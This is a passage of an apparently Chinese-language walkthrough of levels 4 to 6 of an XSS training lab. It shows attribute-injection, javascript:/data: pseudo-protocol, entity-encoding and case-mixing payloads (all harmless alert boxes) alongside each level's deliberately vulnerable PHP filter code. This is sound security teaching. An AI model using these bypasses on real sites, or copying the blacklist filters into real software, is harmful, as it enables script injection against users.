<hr>
<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>类型：输入框类型</p>
<p>解题思路：</p>
<p>输入测试语句</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_11.png" class="" title="在这里插入图片描述">
<p>检查是否被实例化转义</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_12.png" class="" title="在这里插入图片描述">

<ul>
<li>&lt; &gt; &#x2F; 别替换为空  </li>
<li>alert括号中的双引号没有没替换或是实例化转义，即没有过滤双引号</li>
<li>输入的语句有橙色，蓝色部分（被浏览器当作标签）</li>
<li>alert括号内的第一个双引号与value的第一个双号闭合，之后的内容均被认定为标签</li>
</ul>
<p>尝试闭合</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_13.png" class="" title="在这里插入图片描述">
<p>闭合成功，但注入语句仍被该标签包含，不能发挥作用</p>
<h3 id="插入属性"><a href="#插入属性" class="headerlink" title="*插入属性"></a>*插入属性</h3><p>由于&lt;  &gt; &#x2F; 均被过滤，插入一个完整的标签比较困难，可以选择插入属性</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; //</span><br><span class="line">用&#x27;无法闭合value的双引号</span><br></pre></td></tr></table></figure>

<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level5.php?keyword=find a way out!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level4&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);  <span class="comment">//错误展示，0表示不展示错误，即服务器关闭错误回显</span></span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);   <span class="comment">//str_resplace(&quot;被替换字符&quot;,&quot;替换字符&quot;,变量)</span></span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="comment">//没有使用 Htmlspecialchars函数对字符进行实例化转义</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;  </span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str3</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>解题思路：</p>
<p>类型：输入框类型</p>
<p>输入测试语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_14.png" class="" title="在这里插入图片描述">

<ul>
<li>括号内的双引号没有被替换或实例化转义</li>
<li>括号内的双引号与value的双引号闭合</li>
<li>分为橙色，蓝色蓝部分</li>
<li>script标签背替换</li>
</ul>
<p>尝试闭合</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_15.png" class="" title="在这里插入图片描述">

<ul>
<li>闭合后标签逃逸input标签</li>
<li>script标签被改变</li>
</ul>
<p>既然标签被破坏，尝试注入属性</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; //</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_16.png" class="" title="在这里插入图片描述">
<p>onclick 属性也被替换</p>
<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="*伪协议"></a>*伪协议</h3><blockquote>
<p>在 Web 安全中，“伪协议”（Pseudo-protocol）特指浏览器支持的某些特殊 URL 协议格式，它们并非真正的网络传输协议（如 http:&#x2F;&#x2F; 或 https:&#x2F;&#x2F;），而是用于触发特定行为或执行代码。在 XSS（跨站脚本攻击） 场景中，伪协议常被用来绕过过滤规则，直接注入恶意脚本。</p>
</blockquote>
<blockquote>
<p>1.javascript:在 URL 中执行			XSS 攻击 -&gt; JavaScript 代码	javascript:alert(1)<br>2.data:嵌入 Base64 编码的内容（HTML&#x2F;脚本等过内容安全策略（CSP）-&gt;			 data:text&#x2F;html,[script]alert(1)[&#x2F;script]<br>3.vbscript:在旧版 IE 中执行 VBScript 代码 IE 特定漏洞  -&gt;   vbscript:MsgBox(“XSS”)<br>4.about:显示浏览器内部信息或空白页面	 -&gt;   about:blank</p>
</blockquote>
<ul>
<li>js协议:最常见的 XSS 利用方式，通过将伪协议注入到允许 URL 的属性中（如 <a> 标签的 href），触发脚本执行</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基本格式  javascript:JavaScript代码        //注意：若js代码有多行，用分号分割</span><br><span class="line">若要进行编码绕过时，要对&#x27; :JavaScript代码  &#x27; //注意：这一部分进行编码（包括冒号）-&gt; 浏览器会自动解码</span><br><span class="line">返回值为空，为避免因返回值影响页面行为 设置void(0)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0);alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>常用语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>点击触发<span class="tag">&lt;/<span class="name">a</span>&gt;</span>       				//注入 javascript: 触发点击执行</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:&#x27;alert(1)&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>                      //利用 javascript: 动态写入内容</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;jav<span class="symbol">&amp;#x61;</span>script:alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span>        				  //使用 URL 编码或 Unicode 绕过关键字过滤，解码即为javascript</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span>     	 //利用 onclick 事件覆盖 href 行为（需用户交互）</span><br></pre></td></tr></table></figure>
<ul>
<li>data协议：通过嵌入 Base64 编码的 HTML 或脚本，绕过某些过滤规则：</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">基本格式 data:[<span class="tag">&lt;<span class="name">MIME类型</span>&gt;</span>][;charset=<span class="tag">&lt;<span class="name">字符集</span>&gt;</span>][;base64],<span class="tag">&lt;<span class="name">数据内容</span>&gt;</span></span><br><span class="line">1.MIME 类型：声明数据类型（如 text/html、text/javascript）。</span><br><span class="line">2.Base64 编码：可选参数，用于编码二进制或特殊字符内容。</span><br><span class="line">3.浏览器支持：现代浏览器广泛支持，但受 CSP（内容安全策略）限制。</span><br><span class="line"></span><br><span class="line">攻击形式：参考以下常用语句</span><br></pre></td></tr></table></figure>
<p>常用语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span>  		//object 标签的 data 属性注入 Base64 编码的脚本</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span> 		  //iframe 的 src 属性，通过 data: 加载恶意 HTML</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>  						//省略 MIME 类型，某些浏览器允许省略 text/html 声明</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;data:text/javascript,alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 							  //结合 JavaScript 执行，直接通过 data: 执行 JS 代码</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>vbscript协议：仅适用于旧版 IE，执行 VBScript 代码</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;vbscript:MsgBox(&#x27;XSS&#x27;)&quot;</span>&gt;</span>触发<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>bout:通常用于加载空白页面，但可能结合其他漏洞利用</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;about:blank&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>正式解题：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">示例1：</span><br><span class="line">&quot;&gt;  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(&quot;123&quot;)&#x27;</span>&gt;</span> 1<span class="tag">&lt;/<span class="name">a</span>&gt;</span> //</span><br><span class="line">解释：&quot;闭合value的双引号，紧跟的&gt;与&quot;共同实现字符逃逸，使用<span class="tag">&lt;<span class="name">a</span>&gt;</span>标签的属性href+js协议</span><br></pre></td></tr></table></figure>
<p>网页源码：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_17.png" class="" title="在这里插入图片描述">
<p>页面渲染：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_18.png" class="" title="在这里插入图片描述">
<p>点击超链接‘1’，即可通关</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">示例2：</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> //</span><br><span class="line">动态创建标签页面，当标签页面被创建时自动执行js代码</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_19.png" class="" title="在这里插入图片描述">
<p>此时的页面渲染：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_20.png" class="" title="在这里插入图片描述">

<h3 id="趣事"><a href="#趣事" class="headerlink" title="*趣事"></a>*趣事</h3><p>此时你不断刷新页面，页面会不断弹框（刷新一次弹框一次）</p>
<p>对于js协议的剩下编码示例与onclick覆盖就不再演示,以下为具体输入语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;jav<span class="symbol">&amp;#x61;</span>script:alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span>     //注意本题不可以使用onclik </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对于编码，有需要的可以下载插件：CaptfEncoder,编码的作用在于可以绕过一些明文的过滤</p>
<hr>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level5&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="comment">//使用str_replace替换字符  过滤了&lt;  使用伪协议不会涉及&lt; </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进一步解释实例化转义函数Htmlspecialchars()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $str = &quot;Tom&#x27;s \&quot;house\&quot; &amp; &lt;garden&gt;&quot;;</span></span><br><span class="line"><span class="comment">// echo htmlspecialchars($str);                // 默认: Tom&#x27;s&amp;quot;house&amp;quot; &amp;amp; &amp;lt;garden&amp;gt;</span></span><br><span class="line"><span class="comment">// echo htmlspecialchars($str, ENT_QUOTES);    // 转义单引号: Tom&amp;#039;s &amp;quot;house&amp;quot; &amp;amp; &amp;lt;garden&amp;gt;</span></span><br><span class="line"><span class="comment">// echo htmlspecialchars($str, ENT_NOQUOTES);  // 不转义引号: Tom&#x27;s &quot;house&quot; &amp;amp; &amp;lt;garden&amp;gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str3</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>类型：输入框类型</p>
<p>解题思路：</p>
<p>简化流程，由于是输入框类型，直接输入语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_21.png" class="" title="在这里插入图片描述">

<ul>
<li>双引号没有被实例化转义或过滤</li>
<li>实现了字符逃逸</li>
<li>script标签被替换</li>
<li>使用onclick,也会被替换（自主测试，不演示）</li>
</ul>
<p>过滤script则不用script,用伪协议</p>
<p>情况与level5类似，则选择语句：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(&quot;123&quot;)&#x27;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">a</span>&gt;</span> //</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_22.png" class="" title="在这里插入图片描述">
<p>此时的页面渲染</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_23.png" class="" title="在这里插入图片描述">
<ul>
<li>标签实现逃逸</li>
<li>href 被替换</li>
</ul>
<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="*大小写绕过"></a>*大小写绕过</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">sCript</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">scRipt</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<p>成功通关</p>
<ul>
<li>疑问：为什么前面的关卡不使用大小写绕过呢？或是说为什么这关可以使用大小写绕过？代码分析解答</li>
</ul>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level7.php?keyword=move up!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level6&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);  <span class="comment">//替换script标签</span></span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);          <span class="comment">//替换on </span></span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);		 <span class="comment">//替换src</span></span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);    <span class="comment">//替换data</span></span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);   <span class="comment">//替换href</span></span><br><span class="line"><span class="comment">//常规的伪协议无法绕过</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//这里存在两个很大的破绽:</span></span><br><span class="line"><span class="comment">//1.没有先实例化转义变量$str6,只是进行’部分有限‘的’黑名单‘标签替换，就拼接到value的值，</span></span><br><span class="line"><span class="comment">//2.str_replace函数默认区分大小写的且是严格匹配的（只有一样的字符才会被替换）</span></span><br><span class="line"><span class="comment">//1+2-&gt;大小写绕过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//前面的关卡中 level1根本没必要替换 level2在拼接value的值之前就实例化转义了 level3 level4 level5 同理</span></span><br><span class="line"><span class="comment">//为什么在拼接value的值之前就实例化转义了就无法使用大小写绕过呢？</span></span><br><span class="line"><span class="comment">//首先，输入框类型的重点在于如何处理value 1.闭合-&gt;逃逸  2.加属性 </span></span><br><span class="line"><span 